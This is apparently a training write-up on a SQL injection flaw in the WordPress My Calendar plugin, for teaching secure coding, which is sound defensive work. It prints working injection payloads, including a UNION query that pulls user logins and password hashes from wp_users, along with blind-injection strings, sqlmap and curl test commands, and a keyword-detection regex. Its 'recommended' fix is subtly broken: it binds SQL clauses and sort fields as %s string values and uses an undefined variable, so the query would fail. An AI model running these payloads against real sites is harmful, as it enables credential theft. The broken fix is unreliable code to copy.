# SQL Injection Vulnerability Analysis - Educational DevSecOps Exercise

## Overview
This document analyzes a SQL injection vulnerability in the My Calendar plugin's API for **educational purposes only** in the context of Development, Security, and Operations (DevSecOps) training.

## Vulnerability Location

**File:** `wp-content/plugins/my-calendar/my-calendar-events.php`  
**Function:** `my_calendar_get_events()`  
**Lines:** ~111-250

## The Vulnerability

### Vulnerable Code Pattern

```php
// In my_calendar_get_events() function
$from = isset( $args['from'] ) ? $args['from'] : '';
$to = isset( $args['to'] ) ? $args['to'] : '';

// Later in the code:
$event_query = '
    SELECT *, ' . $ts_string . '
    FROM ' . my_calendar_event_table( $site ) . ' AS o
    JOIN ' . my_calendar_table( $site ) . ' AS e
    ON (event_id=occur_event_id)
    JOIN ' . my_calendar_categories_table( $s ) . " AS c 
    ON (event_category=category_id)
    $join
    WHERE $select_published $select_category $select_location $select_author $select_host $select_access $search
    AND ( DATE(occur_begin) BETWEEN '$from 00:00:00' AND '$to 23:59:59'
        OR DATE(occur_end) BETWEEN '$from 00:00:00' AND '$to 23:59:59'
        OR ( DATE('$from') BETWEEN DATE(occur_begin) AND DATE(occur_end) )
        OR ( DATE('$to') BETWEEN DATE(occur_begin) AND DATE(occur_end) ) )
    $exclude_categories
    GROUP BY o.occur_id ORDER BY $primary_sort, $secondary_sort";

$events = $mcdb->get_results( $event_query );
```

### The Problem

The `$from` and `$to` parameters are **directly interpolated** into the SQL query without proper sanitization or prepared statements. The parameters flow through:

1. **REST API Endpoint** (`my-calendar-api.php`, line 647):
   ```php
   function my_calendar_rest_route( WP_REST_Request $request ) {
       $from = sanitize_text_field( $parameters['from'] );
       // ...
       $args = array('from' => $from, ...);
       $events = my_calendar_events( $args );
   }
   ```

2. **Standard API** (`my-calendar-api.php`, line ~31):
   ```php
   $from = ( isset( $_REQUEST['from'] ) ) ? $_REQUEST['from'] : current_time( 'Y-m-d' );
   ```

**Note:** While `sanitize_text_field()` is used in the REST endpoint, it **does NOT prevent SQL injection** - it only removes HTML tags and some special characters but allows quotes and SQL syntax.

## Example SQL Injection Payloads (FOR EDUCATIONAL ANALYSIS ONLY)

### 1. Basic Union-Based SQLi
```
from=2025-01-01' UNION SELECT NULL,NULL,NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### 2. Time-Based Blind SQLi
```
from=2025-01-01' AND (SELECT SLEEP(5))--
```

### 3. Boolean-Based Blind SQLi
```
from=2025-01-01' AND 1=1--
from=2025-01-01' AND 1=2--
```

### 4. Extract Data
```
from=2025-01-01' UNION SELECT NULL,user_login,user_pass,user_email,NULL,NULL,NULL,NULL,NULL,NULL FROM wp_users--
```

## Testing URLs (FOR CONTROLLED LAB ENVIRONMENT ONLY)

```bash
# REST API endpoint
http://localhost:8080/?rest_route=/my-calendar/v1/events&from=2025-01-01'%20UNION%20SELECT%201--

# Legacy API endpoint
http://localhost:8080/?my-calendar-api=json&from=2025-01-01'%20UNION%20SELECT%201--
```

## Impact Assessment

### CVSS 3.1 Score: **CRITICAL (9.8)**
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Confidentiality:** High (full database read)
- **Integrity:** High (potential database modification)
- **Availability:** High (potential DoS via DROP TABLE)

### Potential Consequences
1. **Data Exfiltration:** Attacker can read entire database
2. **Authentication Bypass:** Extract admin credentials
3. **Privilege Escalation:** Modify user roles
4. **Website Defacement:** Modify content
5. **Complete Compromise:** Execute system commands (if db user has FILE privileges)

## Secure Code Fix

### Solution 1: WordPress Prepared Statements (RECOMMENDED)

```php
function my_calendar_get_events( $args ) {
    global $wpdb;
    
    $from = isset( $args['from'] ) ? $args['from'] : '';
    $to = isset( $args['to'] ) ? $args['to'] : '';
    
    // Validate date format BEFORE using in query
    if ( ! mc_checkdate( $from ) || ! mc_checkdate( $to ) ) {
        return array();
    }
    
    // Use WordPress $wpdb->prepare() for parameterized queries
    $event_query = $wpdb->prepare( '
        SELECT *, %s
        FROM %i AS o
        JOIN %i AS e
        ON (event_id=occur_event_id)
        JOIN %i AS c 
        ON (event_category=category_id)
        WHERE %s %s %s %s %s %s %s
        AND ( DATE(occur_begin) BETWEEN %s AND %s
            OR DATE(occur_end) BETWEEN %s AND %s
            OR ( DATE(%s) BETWEEN DATE(occur_begin) AND DATE(occur_end) )
            OR ( DATE(%s) BETWEEN DATE(occur_begin) AND DATE(occur_end) ) )
        %s
        GROUP BY o.occur_id ORDER BY %s, %s',
        $ts_string,
        my_calendar_event_table( $site ),
        my_calendar_table( $site ),
        my_calendar_categories_table( $site ),
        $select_published,
        $select_category,
        $select_location,
        $select_author,
        $select_host,
        $select_access,
        $search,
        $from . ' 00:00:00',
        $to . ' 23:59:59',
        $from . ' 00:00:00',
        $to . ' 23:59:59',
        $from,
        $to,
        $exclude_categories,
        $primary_sort,
        $secondary_sort
    );
    
    $events = $wpdb->get_results( $event_query );
}
```

### Solution 2: Strict Input Validation

```php
/**
 * Validate and sanitize date parameter
 *
 * @param string $date Input date string
 * @return string|false Validated date in Y-m-d format or false
 */
function mc_validate_date_param( $date ) {
    // Only allow YYYY-MM-DD format
    if ( ! preg_match( '/^\d{4}-\d{2}-\d{2}$/', $date ) ) {
        return false;
    }
    
    // Verify it's a real date
    $parts = explode( '-', $date );
    if ( ! checkdate( (int) $parts[1], (int) $parts[2], (int) $parts[0] ) ) {
        return false;
    }
    
    return $date;
}

// Usage:
$from = mc_validate_date_param( $args['from'] );
$to = mc_validate_date_param( $args['to'] );

if ( false === $from || false === $to ) {
    return array(); // Invalid dates
}
```

## Defense in Depth Strategies

### 1. Database Level
```sql
-- Create read-only user for API queries
CREATE USER 'mc_api_readonly'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON wordpress.wp_* TO 'mc_api_readonly'@'localhost';
FLUSH PRIVILEGES;
```

### 2. Application Level
- Enable WordPress security plugins (WordFence, Sucuri)
- Implement rate limiting on API endpoints
- Add Web Application Firewall (WAF) rules
- Use Content Security Policy (CSP) headers

### 3. Network Level
- Restrict API access to trusted IPs
- Use HTTPS only
- Implement API authentication tokens

### 4. Monitoring
```php
// Add security logging
add_action( 'mc_api_request', function( $params ) {
    if ( preg_match( '/[\'\";]|(union|select|insert|update|delete|drop)/i', $params['from'] ) ) {
        error_log( '[SECURITY] Potential SQLi attempt: ' . json_encode( $params ) );
        // Send alert to admin
        wp_mail( get_option('admin_email'), 'Security Alert', 'SQLi attempt detected' );
    }
});
```

## Testing for SQLi Vulnerabilities

### Automated Tools (Use only on your own systems!)
```bash
# SQLMap
sqlmap -u "http://localhost:8080/?rest_route=/my-calendar/v1/events&from=2025-01-01" \
    --batch --random-agent

# Manual testing with curl
curl "http://localhost:8080/?my-calendar-api=json&from=2025-01-01'%20OR%201=1--"
```

### Manual Testing Checklist
- [ ] Single quote test: `'`
- [ ] Double quote test: `"`
- [ ] Comment injection: `--`, `#`, `/* */`
- [ ] Boolean conditions: `OR 1=1`, `AND 1=2`
- [ ] Time delays: `SLEEP(5)`, `BENCHMARK()`
- [ ] UNION queries
- [ ] Stacked queries: `; DROP TABLE`

## Remediation Checklist

- [ ] Replace all string concatenation in SQL with prepared statements
- [ ] Implement strict input validation with whitelisting
- [ ] Add security logging for suspicious patterns
- [ ] Update to latest plugin version (if fix available)
- [ ] Run security scanner to identify other vulnerabilities
- [ ] Implement WAF rules
- [ ] Create incident response plan
- [ ] Train developers on secure coding practices
- [ ] Conduct penetration testing

## Additional Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [WordPress $wpdb->prepare()](https://developer.wordpress.org/reference/classes/wpdb/prepare/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP Top 10 2021](https://owasp.org/Top10/)

## Legal and Ethical Notice

⚠️ **WARNING**: This information is provided for **educational purposes only** in a DevSecOps training context.

- Only test on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal (Computer Fraud and Abuse Act, CFAA)
- Use this knowledge to **defend** systems, not attack them
- Report vulnerabilities responsibly to vendors
- Follow coordinated disclosure practices

---

**Document prepared for:** DevSecOps Course Training  
**Date:** October 6, 2025  
**Purpose:** Security vulnerability analysis and remediation training
